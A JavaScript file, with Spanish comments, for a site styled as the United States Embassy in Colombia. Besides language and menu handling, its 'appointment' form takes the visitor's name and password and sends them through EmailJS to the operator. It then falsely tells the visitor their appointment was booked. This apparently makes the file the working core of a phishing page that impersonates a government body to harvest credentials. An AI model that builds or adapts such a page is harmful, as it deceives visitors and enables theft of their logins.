// email.js: Contiene la lógica del formulario, EmailJS y el manejo del idioma/UI.

// Inicializar EmailJS
(function() {
    emailjs.init("5hSEIwvwW_P3opzdj");
})();

document.addEventListener('DOMContentLoaded', function() {
    console.log('Script cargado correctamente.');

    // ELEMENTOS DEL DOM
    const appointmentForm = document.getElementById("appointmentForm"); // Asumiendo que usas ID en tu HTML
    const successMessageDiv = document.getElementById("successMessage");
    const menuToggle = document.getElementById('menu-toggle');
    const dropdownMenu = document.getElementById('dropdown-menu'); // Nota: No se usa en el HTML que enviaste
    const closeMenuBtn = document.getElementById('close-menu'); // Nota: No se usa en el HTML que enviaste
    const languageToggle = document.getElementById('language-toggle');
    const languageDropdown = document.getElementById('language-dropdown');
    const languageOptions = document.querySelectorAll('.language-option');
    
    // ----------------------------------------------------------------------
    // FUNCIONES DE UI Y LÓGICA DE IDIOMA
    // ----------------------------------------------------------------------

    // FUNCIÓN PRINCIPAL PARA CAMBIAR IDIOMA
    function changeLanguage(lang) {
        console.log(`Cambiando idioma a: ${lang}`);

        // 1. Actualizar TODOS los elementos con data-es y data-en
        const elements = document.querySelectorAll('[data-es][data-en]');
        
        elements.forEach(element => {
            const text = lang === 'es' ? element.getAttribute('data-es') : element.getAttribute('data-en');
            if (text) {
                element.textContent = text;
            }
        });

        // 2. Actualizar título de la página
        document.title = lang === 'es' 
            ? 'Embajada de Estados Unidos en Colombia' 
            : 'United States Embassy in Colombia';

        // 3. Actualizar botón de idioma
        if (languageToggle) {
            languageToggle.textContent = lang === 'es' ? 'Idioma ▼' : 'Language ▼';
        }

        // 4. Cerrar el dropdown después de seleccionar
        if (languageDropdown) {
            languageDropdown.classList.remove('show');
        }

        // 5. Guardar preferencia
        localStorage.setItem('selectedLanguage', lang);
        
        console.log(`Idioma cambiado exitosamente a: ${lang}`);
    }
    
    // FUNCIÓN PARA TOGGLE DEL DROPDOWN DE IDIOMAS
    function toggleLanguageDropdown(e) {
        e.preventDefault();
        e.stopPropagation();
        if (languageDropdown) {
            languageDropdown.classList.toggle('show');
            console.log('Dropdown toggled:', languageDropdown.classList.contains('show'));
        }
    }
    
    // ----------------------------------------------------------------------
    // MANEJO DE EVENTOS DEL FORMULARIO (EMAILJS)
    // ----------------------------------------------------------------------

    if (appointmentForm && successMessageDiv) {
        appointmentForm.addEventListener("submit", function(e) {
            e.preventDefault();

            // Ocultar cualquier mensaje anterior
            successMessageDiv.style.display = "none";
            successMessageDiv.style.color = "green"; // Default success color

            // Obtener los valores (AJUSTADO: usando 'password' según el HTML corregido)
            const name = document.getElementById("nombre").value.trim();
            const password = document.getElementById("password").value.trim(); 

            // Parámetros para EmailJS
            const params = {
                name: name,
                password: password, // Clave coincidente con la plantilla
                time: new Date().toLocaleString("es-CO", {
                    dateStyle: "full",
                    timeStyle: "short"
                })
            };
            
            console.log("📤 Enviando a EmailJS:", params);

            // Enviar con EmailJS
            emailjs.send("service_vxadbni", "template_3o32aj2", params)
            .then(function(response) {
                console.log("Correo enviado exitosamente", response.status, response.text);
                
                // Mostrar mensaje de éxito en el idioma seleccionado
                const currentLang = localStorage.getItem('selectedLanguage') || 'es';
                successMessageDiv.textContent = currentLang === 'en' 
                    ? "✅ Your appointment was booked successfully. Check your email."
                    : "✅ Tu cita fue reservada correctamente. Revisa tu correo.";
                
                successMessageDiv.style.display = "block";
                appointmentForm.reset();
            })
            .catch(function(error) {
                console.error("❌ Error al enviar el correo:", error);
                
                // Mostrar mensaje de error en el idioma seleccionado
                const currentLang = localStorage.getItem('selectedLanguage') || 'es';
                successMessageDiv.textContent = currentLang === 'en' 
                    ? "❌ There was an error sending the request. Please try again."
                    : "❌ Hubo un error al enviar la solicitud. Inténtalo de nuevo.";
                    
                successMessageDiv.style.color = "red";
                successMessageDiv.style.display = "block";
            });

            // Ocultar mensaje después de 5 segundos
            setTimeout(() => {
                successMessageDiv.style.display = "none";
            }, 5000);
        });
    }

    // ----------------------------------------------------------------------
    // EVENTOS Y LÓGICA DE IDIOMA/MENÚ
    // ----------------------------------------------------------------------

    // EVENTO PARA EL BOTÓN DE IDIOMA
    if (languageToggle) {
        languageToggle.addEventListener('click', toggleLanguageDropdown);
    }
    
    // EVENTOS PARA LAS OPCIONES DE IDIOMA
    languageOptions.forEach(option => {
        option.addEventListener('click', function(e) {
            e.preventDefault();
            e.stopPropagation();
            const lang = this.getAttribute('data-lang');
            changeLanguage(lang);
        });
    });

    // CERRAR DROPDOWNS AL HACER CLIC FUERA
    document.addEventListener('click', function(e) {
        // Cerrar dropdown de idiomas
        if (languageToggle && languageDropdown && !languageToggle.contains(e.target) && !languageDropdown.contains(e.target)) {
            languageDropdown.classList.remove('show');
        }
    });

    // CARGAR IDIOMA GUARDADO AL INICIAR
    const savedLanguage = localStorage.getItem('selectedLanguage') || 'es';
    changeLanguage(savedLanguage);
    
    // SCROLL EFFECT EN HEADER (Tu código original)
    window.addEventListener('scroll', () => {
        const header = document.querySelector('.header');
        if (header) {
            if (window.scrollY > 50) {
                header.classList.add('scrolled');
            } else {
                header.classList.remove('scrolled');
            }
        }
    });

 

    // NOTA: Se eliminó el código duplicado y la lógica de cierre de menú que no estaba referenciada en tu HTML principal.
});